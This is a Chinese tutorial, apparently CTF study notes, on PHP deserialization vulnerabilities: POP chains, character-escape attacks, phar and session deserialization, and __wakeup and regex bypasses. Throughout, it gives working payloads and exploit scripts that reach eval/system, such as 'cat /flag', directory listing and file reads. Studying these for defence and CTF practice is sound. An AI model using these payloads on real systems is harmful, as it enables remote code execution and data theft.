# **反序列化**
!!! note
    序列化/反序列化是对对象的操作，学习前先了解一下面向对象

    目前只有PHP反序列化，期待补充

## **概念与基础知识**

**序列化就是将一个对象转换成字符串。字符串包括，属性名，属性值，属性类型和该对象对应的类名。**
**反序列化则相反将字符串重新恢复成对象**

| 类型     | 过程          |
| :------- | :------------ |
| 序列化   | 对象—> 字符串 |
| 反序列化 | 字符串—>对象  |

对象的序列化利于对象的 **保存和传输** ，也可以让**多个文件共享对象**。

## **php反序列化**

**漏洞触发条件：** `unserialize`函数的参数、变量可控，php文件中存在可利用的类，类中有魔术方法

### **魔术方法**

是用来让开发者能够**拦截**或**重载**PHP的默认对象行为，提供更灵活的对象操作方式。它们允许你在对象生命周期中的特定时刻插入自定义逻辑。PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，可以把它们理解为钩子。

一些常见的魔术方法

```php
__construct()    //用于在创建对象时自动触发当使用 new 关键字实例化一个类时，会自动调用该类的 __construct() 方法
__destruct()     //__destruct() 用于在对象被销毁时自动触发对象的销毁对象的引用计数减少为零来触发
__sleep()        //序列化serialize() 函数会检查类中是否存在一个魔术方法sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组
__wakeup()       //用于在反序列化对象时自动调用unserialize() 会检查是否存在一个 wakeup() 方法，如果存在，则会先调用wakeup()方法
__tostring()     //__tostring() 在对象被当做字符串处理时自动调用比如echo、==、preg_match()
__invoke()       //__invoke() 在对象被当做函数处理时自动调用
__call()         //__call($method, $args) 在调用一个不存在的方法时触发, $args是数组的形式
__callStatic()   //__callStatic() 在静态调用或调用成员常量时使用的方法不存在时触发
__set()          //__set() 在给不存在的成员属性赋值时触发
__isset()        //__isset() 在对不可访问属性使用 isset() 或empty() 时会被触发
__unset()        //__unset() 在对不可访问属性使用 unset() 时会被触发
__clone()        //__clone() 当使用 clone 关键字拷贝完成一个对象后就会触发 
__get()          //__get() 当尝试访问不可访问属性时会被自动调用
```



### 序列化后的结构

```php
<?php
$user=array('xiao','shi','zi');
$user=serialize($user);
echo($user.PHP_EOL);
print_r(unserialize($user));

/*
输出：
a:3:{i:0;s:4:"xiao";i:1;s:3:"shi";i:2;s:2:"zi";}
Array
(
[0] => xiao
[1] => shi
[2] => zi
)

a:3:{i:0;s:4:"xiao";i:1;s:3:"shi";i:2;s:2:"zi";}
a:array代表是数组，后面的3说明有三个属性
i:代表是整型数据int，后面的0是数组下标
s:代表是字符串，后面的4是因为xiao长度为4
依次类推
```

序列化后的内容只有成员变量即属性，没有成员函数

比如下面的例子：

序列化输出中只有属性`$a`和`$b`的值，方法`happy()`和`__construct()`不会出现在序列化数据中

所以在进行序列化构造完pop链后，可以删去成员函数，缩短代码长度，便于检查正确与否

```php
<?php
class test{
public $a;
public $b;
function __construct(){$this->a = "xiaoshizi";$this->b="laoshizi";}
function happy(){return $this->a;}
}
$a = new test();
echo serialize($a);
?>

/*
输出：
O:4:"test":2:{s:1:"a";s:9:"xiaoshizi";s:1:"b";s:8:"laoshizi";}

O:4:"test":2中
O代表Object
4代表test的长度
test是类的名字
2代表这个类有两个属性

s:1:"a";s:9:"xiaoshizi";

s:1:"a" - 属性名
s 表示字符串类型
1 表示字符串长度
"a" 是属性名
s:9:"xiaoshizi" - 属性值
s 表示字符串类型
9 表示字符串长度
"xiaoshizi" 是属性值
```

### **访问控制修饰符**

根据**访问控制修饰符的不同** 序列化后的 **属性长度**和**属性值**会有所不同，所以这里简单提一下

```php
public(公有) 
protected(受保护)     // %00*%00属性名
private(私有的)       // %00类名%00属性名
```

而如果变量前是`protected`，则会在变量名前加上\x00*\x00,

`private`则会在变量名前加上\x00类名\x00,

输出时一般需要url编码，如下：

```php
<?php
class test{
protected $a;
private $b;
function __construct(){$this->a = "xiaoshizi";$this->b="laoshizi";}
function happy(){return $this->a;}
}
$a = new test();
echo serialize($a);
echo urlencode(serialize($a));
?>

/*
输出：
O:4:"test":2:{s:4:" * a";s:9:"xiaoshizi";s:7:" test b";s:8:"laoshizi";}
O%3A4%3A%22test%22%3A2%3A%7Bs%3A4%3A%22%00%2A%00a%22%3Bs%3A9%3A%22xiaoshizi%22%3Bs%3A7%3A%22%00test%00b%22%3Bs%3A8%3A%22laoshizi%22%3B%7D
如下
protected $a;
" * a"
%22%00%2A%00a%22

private $b;
" test b"
%22%00test%00b%22%

*/
```









### **POP链构造**

 魔术方法会在CTF被用来精心构造能自动触发的“链子”，而且一般的CTF题目中，不会存在很多的类，排除迷惑类，真正构造pop链的类很少，审计代码的工作量不大。

构造pop链的目的是获取shell或者读取flag。所以首先要找到真正执行命令的地方。然后根据魔术方法进行反推，入口一般是创建对象或者销毁对象时的魔术方法`__wakeup()`或`__destruct()`。确定了入口以及终点，中间的链子的构造就会比较清晰。总而言之，**逆向分析，正向构造**

例子

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
class demo1{
    public $d1text1;
    public $d1text2;
    public function __destruct(){
        echo $this->d1text1;
    }
}
class demo2{
    public $d2text1;
    public $d2text2;
    public function __tostring(){
        $this->d2text1->d1text1();
    }
    
}
class demo3{
    public $d3text1;
    public $d3text2;
    public function __call($method, $args){
        eval($this->d3text1);
    }
}
$a=$_GET['data'];
unserialize($a);
?>
```

只有三个类。按照上面的构造思路

 

先找**终点**，在类`demo3`中存在一个魔术方法`__call()`，其中有函数`eval()`，可以用来执行任意命令，所以我们最终利用到这里就可以了。

再找入口点，上面提到入口一般是`__wakeup()`,或者`__destruct()` 等可以在反序列化时自动触发的魔术方法。在类`demo1`中存在入口方法`__destruct()`。

最后就是要利用类`demo2`进行链子的搭建，魔术方法`__tostring()`的触发方式：**在对象被当做字符串处理，例如echo，==，preg_match()等函数**

入口函数中就存在

```php
public function __destruct(){
        echo $this->d1text1;
```

如果我们把`$d1text1`赋值成`demo2`实例化后的对象，这样就会触发了`__tostring()`这个方法。

然后再把类`demo2`中的`$d2text1`赋值成`demo3`实例化后的对象

我们再看`__call`的触发情况，在调用一个不存在的方法时触发

这个地方在第二个类中，我们可以发现

```php
public function __tostring(){
        $this->d2text1->d1text1();
    }
```

调用了一个`d1text1()`方法，这个方法并不存在，在这里会触发魔术方法`__call()`。

至此pop链就已经完成了。

流程如下：

通过`unserialize($a);`反序列化时触发`demo1`类中的`__destruct()`方法，实例化会执行`echo`函数，`echo`函数会触发`__tostring()`魔术方法，实例化会调用不存在的`d1text1()`函数，从而触发魔术方法`__call()`，导致`eval($this->d3text1);`函数的调用，从而执行任意命令

```pop
demo1->demo2->demo3 
```

exp如下： 

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
class demo1{
    public $d1text1;
    public $d1text2;
    public function __destruct(){
        echo $this->d1text1;
    }
}
class demo2{
    public $d2text1;
    public $d2text2;
    public function __tostring(){
        $this->d2text1->d1text1();
    }

}
class demo3{
    public $d3text1;
    public $d3text2;
    public function __call($method, $args){
        eval($this->d3text1);
    }
}

$a = new demo1();
$a->d1text1 = new demo2();
$a->d1text1->d2text1 = new demo3();
$a->d1text1->d2text1->d3text1 = 'system("cat /flag");';
echo serialize($a);

?>
```

构造完思路后也可以删除成员函数，生成pop链，

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
class demo1{
    public $d1text1;
    public $d1text2;
}
class demo2{
    public $d2text1;
    public $d2text2;

}
class demo3{
    // public $d3text1 = 'system("cat /flag")'; // 直接在原代码中给属性赋值更简洁
    public $d3text1;
    public $d3text2;
}

$a = new demo1();
$a->d1text1 = new demo2();
$a->d1text1->d2text1 = new demo3();
$a->d1text1->d2text1->d3text1 = 'system("cat /flag");';
// $a->d1text1->d2text1->d3text1;
echo serialize($a);

// 结果
/*
O:5:"demo1":2:{s:7:"d1text1";O:5:"demo2":2:{s:7:"d2text1";O:5:"demo3":2:{s:7:"d3text1";s:19:"system("cat /flag");";s:7:"d3text2";N;}s:7:"d2text2";N;}s:7:"d1text2";N;}

格式化

O:5:"demo1":2:{
    s:7:"d1text1";
    O:5:"demo2":2:{
        s:7:"d2text1";
        O:5:"demo3":2:{
            s:7:"d3text1";s:19:"system("cat /flag");";
            s:7:"d3text2";N;
        }
        s:7:"d2text2";N;
    }
    s:7:"d1text2";N;
}

?>
```

## PHP反序列化字符逃逸

当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。

这个时候就有可能会产生PHP反序列化字符逃逸的漏洞

### 字符增加

例子

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}



function filter($s){
    return str_replace("admin","hacker",$s);
}

$a = new user("admin","123456");
$a_seri = serialize($a);
# O:4:"user":3:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}

$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
# O:4:"user":3:{s:8:"username";s:5:"hacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}

?>

```

对比一下

```php
O:4:"user":3:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}  //未过滤
O:4:"user":3:{s:8:"username";s:5:"hacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;} //已过滤

s:5:"admin"
s:5:"hacker"
```

可以发现字符长度不对应，结果多出一个字符，这时的序列化数据结构被破坏

**如果构造类似序列化数据的结构，并让其逃逸出反序列化的结构，就可以任意伪造参数**

这个时候传入的admin就是可控变量

定一个目标，让`isVIP = 1`

那就是

```php
";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;} // 现在的

";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;} //要实现的

```

字符串的长度为47，即我们需要逃逸的字符串长度，我们需要传入`admin * 47`从而replace后，会多出47个字符

如果我们传入

```
adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}
```





```php

O:4:"user":3:{s:8:"username";s:282:"adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;} // 未替换

O:4:"user":3:{s:8:"username";s:282:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}//替换后

```

这时，由于`s:282:`到最后一个`hacker`即截止（47个hacker，共282个字符）

后面的`s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}`将会被识别为序列化的结构

因为`O:4:"user":3:`只会识别三个属性，多余的`";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}`将会被抛弃，从而成功反序列化为`isVIP=1`



### 字符减少

和上面的原理类似

这里把admin替换为hack,替换后字符减少

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s){
    return str_replace("admin","hack",$s);
}

$a = new user('admin','123456');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?>

```



```php
O:4:"user":3:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;} //替换前

O:4:"user":3:{s:8:"username";s:5:"hack";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;} // 替换后
```

同样的目标

```php
";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;} // 现在的

";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;} //要实现的 长度47
```

这里要了解一下

> PHP反序列化的机制是，规定了有10个字符，第9个就到了双引号，这个时候PHP会把双引号当做第10个字符，并不根据双引号判断一个字符串是否已经结束，而是根据规定的数量来读取字符串。



过滤之后，5个字符变为4个，后面的字符会被”吞掉了“

既然字符串会被吞掉，那我们就可以吞掉`";s:8:"password";s:6: ` 即21个admin

然后用password构造新值即`;s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}` 46个字符

password构造完`s:6`会变为`s:46`，这样又要多一位字符 最终构造22个admin，从而吞22个字符

这样就是

```php
O:4:"user":3:{s:8:"username";s:少22个字符:"hack";s:8:"password";s:46:";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:5:"isVIP";i:0;}
```



也就是我们可以传入22个admin和构造的字符串

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s){
    return str_replace("admin","hack",$s);
}

$a = new user('admin * 22'/* 就这么表示22个admin吧 */,';s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}'); //46个字符

$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?>

# O:4:"user":3:{s:8:"username";s:110:"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:46:";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:5:"isVIP";i:0;}

```

反序列化即是

```
object(user)#2 (3) { ["username"]=> string(110) "hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:46:" ["password"]=> string(6) "123456" ["isVIP"]=> int(1) }
```



**数组逃逸闭合要加一个}，即用";}闭合**









## Phar反序列化



> phar，全称为`PHP Archive`，phar扩展提供了一种将整个PHP应用程序放入`.phar`文件中的方法，以方便移动、
>
> 安装。`.phar`文件的最大特点是将几个文件组合成一个文件的便捷方式，提供了一种将完整的PHP程
>
> 序分布在一个文件中并从该文件中运行的方法。



文件结构在[文件包含](./从零开始的Web之路-文件包含篇.md/#phar)中讲过，这里主要讲如何利用

### 利用

将要序列化的内容写入`meta-data`中，再使用phar伪协议进行反序列化。

首先需要生成phar文件，在php的配置文件中需要设置`phar.readonly= off`。

```php
<?php
class A {
    public $a;

    public function __destruct()
    {
        system($this->cmd);
    }
}
$a = new A();
$a->cmd='ls';
$phar = new Phar("demo.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");//设置stub
$phar->setMetadata($a);//将自定义的meta-data存入manifest
$phar->addFromString("demo.txt", "demo");//添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

将生成的phar文件上传，并且用phar协议包含（配合文件上传文件包含打组合拳），即可执行其中的命令



只要调用了`php_stream_open_wrapper`的函数,都存在此漏洞



### 过滤绕过

#### 字符

当环境限制了phar不能出现在前面的字符里
```
compress.bzip://phar:///test.phar/test.txt
compress.bzip2://phar:///test.phar/test.txt
compress.zlib://phar:///home/sx/test.phar/test.txt
php://filter/resource=phar:///test.phar/test.txt
php://filter/read=convert.base64-encode/resource=phar://phar.phar
```

#### 文件

php识别phar文件是通过文件头的stub，即`__HALT_COMPILER();?>`这段代码

所以可以任意修改文件后缀，或者添加其他文件文件头



## Session反序列化

session反序列化的漏洞是由三种不同的**反序列化引擎**所产生的的漏洞：

`php_binary`:存储方式是，键名的长度对应的ASCII字符+键名+经过`serialize()`函数序列化处理的值

`php`:存储方式是，键名+竖线+经过serialize()函数序列处理的值

`php_serialize`(php>5.5.4):存储方式是，经过`serialize()`函数序列化处理的值

三种引擎的存储格式：

```php
php : a|s:3:"zzz";
php_serialize : a:1:{s:1:"a";s:3:"zzz";}
php_binary : as:3:"zzz";
```



#### 可传入session

1.php

```php
<?php
ini_set("session.serialize_handler", "php_serialize");

session_start();
$_SESSION['zzz'] = $_GET['a'];
echo "";
var_dump($_SESSION);
echo "";
?>
  
#传入 |O:7:"student":2:{s:4:"name";s:4:"name";s:3:"age";s:3:"100";}
```



2.php

```php
<?php
ini_set('session.serialize_handler', 'php');
session_start();
class demo2{
    var $name;
    var $age;
    function __wakeup(){
        echo "hello ".$this->name."!";
    }
}
?>
# 再次访问会输出 hello name
```



攻击思路：

首先访问`1.php`，在传入的参数最开始加一个`|`，由于`1.php`是使用`php_serialize`引擎处理，因此只会把`|`当做一个正常的字符。然后访问`2.php`，由于用的是php引擎，因此遇到`|`时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析`session`文件时直接对`|`后的值进行反序列化处理。



#### session.upload_progress

不存在入口点

```php
<?php
ini_set('session.serialize_handler', 'php');

session_start();

class demo
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }
    function __destruct()
    {
        eval($this->mdzz);
    }
}
if (isset($_GET['phpinfo']))
    $m = new demo();
else
highlight_string(file_get_contents('D:\phpstudy_pro\WWW\1\2.php'));
?>
# 这里session.serialize_handle的master value为php_serialize
```



文件开启

`ini_set('session.serialize_handler', 'php');`

而php配置为`session.serialize_handler=php_serialize`的情况，造成`php_serialize`引擎与`php`引擎的差异

需要开启`session.upload_progress.enabled = On`一般默认on



通过POST方法来构造数据传入`$_SESSION`，首先构造POST提交表单

```php
<form action="url/index.php" method="POST" enctype="multipart/form-data"> 修改url
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```



抓包修改文件名为payload`|O:4:\"demo\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}`

读取文件的payload为`|O:4:\"demo\":1:{s:4:\"mdzz\";s:41:\"print_r(file_get_contents("./flag.php"));\";}` 



## PHP反序列化Bypass

### php7.1+反序列化对类属性不敏感

前面说了如果变量前是protected，序列化结果会在变量名前加上`\x00*\x00`，但在特定版本7.1以上则对于类属性不敏感

比如下面的例子即使没有`\x00*\x00`也依然会输出abc。

```php
<?php
class test{
protected $a;
public function __construct(){
$this->a = 'abc';
}
public function __destruct(){
echo $this->a;
}
}
unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');

#输出：abc
```



### 绕过__wakeup



#### CVE-2016-7124

适用版本：
PHP5 < 5.6.25
PHP7 < 7.0.10

利用方式：序列化字符串中表示**对象属性个数的值大于真实的属性个数**时会跳过`__wakeup()`的执行。

对于下面这样一个自定义类：

```php
<?php
class test{
public $a;
public function __construct(){
$this->a = 'abc';
}
public function __wakeup(){
$this->a='666';
}
public function __destruct(){
echo $this->a;
}
}
$t='O:4:"test":1:{s:1:"a";s:4:"yyds";}';
unserialize($t);
```

如果执行`unserialize('O:4:"test":1:{s:1:"a";s:4:"yyds";}');`输出结果为666,

而把对象属性个数的值从1改为2

执行`unserialize('O:4:"test":2:{s:1:"a";s:4:"yyds";}');`输出结果为yyds。

#### 利用包含引用

在php里，我们可使用引用的方式让两个变量同时指向同一个内存地址，这样对其中一个变量操作时，另一个变量的值也会随之改变。

比如：

```
<?php
function test (&$a){
    $b = &$a;
    $b = '123';
}
$a = '11';
test($a);
echo $a;
```

输出:

```
123
```

虽然给$a赋值为11，但是在执行`text()`时，用 `$b = &$a;`让`$b`和`$a`指向同一个内存,修改`$b=123`后，`$a`也被改变了

举个例子

```php
<?php

class demo{
    public $key;
    public function __destruct()
    {
        $this->key=False;
        if(!isset($this->wakeup)||!$this->wakeup){
            echo "OK";
        }
    }
    public function __wakeup(){
        $this->wakeup=True;
    }
}
$a = $_GET['data'];
unserialize($a);
}
```

在反序列化的时候会触发`__wakeup()`赋值`$this->wakeup=True;`导致`if(!isset($this->wakeup)||!$this->wakeup)`判断不成立

这里就是绕过wakeup，用引用赋值来bypass

```php
<?php

class demo{
    public $key;

    public function __destruct()
    {
    }

}

$a = new demo();
$a->key=&$a->wakeup;
echo serialize($a); 

/* 
O:4:"demo":2:{s:3:"key";N;s:6:"wakeup";R:2;}
```

反序列化的时候`__wakeup()`赋值`$wakeup`为true，key的引用导致wakeup又被赋值为空，从而绕过if



#### Fast-Destruct

**正常反序列化流程**

PHP 反序列化时通常的执行顺序：

1. 创建对象实例
2. 恢复对象属性
3. 调用 `__wakeup()` 方法（如果存在）
4. 脚本结束时调用 `__destruct()` 方法

##### 减少闭合大括号 `}`

```php
// 原始序列化数据
O:4:"demo":4:{...}}

// 攻击payload（减少一个 }）
O:4:"demo":4:{...}
```

使 PHP 解析器认为序列化数据提前结束

触发对象销毁流程

##### 在引用后添加无效数据



```php
// 原始引用
s:4:"hint";r:10;}

// 攻击payload（在引用后添加 1）
s:4:"hint";r:10;1}
```

破坏序列化结构但保持语法有效

导致解析器异常处理



正常情况下：`__wakeup()` → 其他代码 → `__destruct()`

攻击情况下：直接触发 `__destruct()`

##### 9618

[php issue#9618](https://github.com/php/php-src/issues/9618#/)

版本：7.4.x -7.4.30；8.0.x

```php
<?php

class A
{
    public $info;
    private $end = "1";

    public function __destruct()
    {
        $this->info->func();
    }
}

class B
{
    public $end;

    public function __wakeup()
    {
        $this->end = "exit();";
        echo '__wakeup';
    }

    public function __call($method, $args)
    {
        eval('echo "aaaa";' . $this->end . 'echo "bbb"');
    }
}

unserialize($_POST['data']);

```

`private $end = "1";`

`[POST]data=O:1:"A":2:{s:4:"info";O:1:"B":1:{s:3:"end";N;}s:6:"Aend";s:1:"1";}`

这里的`s:6:"Aend"`实际上就是`Aend`这四个字符，不加`\0类名\0`，从而破坏反序列化的结构

从而绕过wakeup



### 16进制绕过字符过滤

```php
O:4:"test":2:{s:4:"%00*%00a";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
可以写成
O:4:"test":2:{S:4:"\00*\00\61";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
表示字符类型的s大写时，会被当成16进制解析。
```



### 绕过部分正则

`preg_match('/^O:\d+/')`匹配序列化字符串是否是对象字符串开头

#### 利用加号绕过

> 注意在url里传参时+要编码为%2B

```php
$a = 'O:4:"test":1:{s:1:"a";s:3:"abc";}'; //+号绕过 
$b = str_replace('O:4','O:+4', $a);
// O:+4:"test":1:{s:1:"a";s:3:"abc";}'
```

#### serialize( array( a) );

a为要反序列化的对象（序列化结果开头是a，不影响作为数组元素的$a的析构）



```php
// 修改serialize($a);为
serialize(array($a));
unserialize('a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}');
```



除此之外，还可以

`$oa=new ArrayObject($a);`(php 7.3.4)

会生成以C开头的序列化数据，同时正常反序列化也可以绕过`__wakeup()`

```
ArrayObject::unserialize
ArrayIterator::unserialize
RecursiveArrayIterator::unserialize
SplObjectStorage::unserialize
```









[参考](https://xz.aliyun.com/news/16664#/)；[参考](https://forum.butian.net/index.php/share/3007#/)

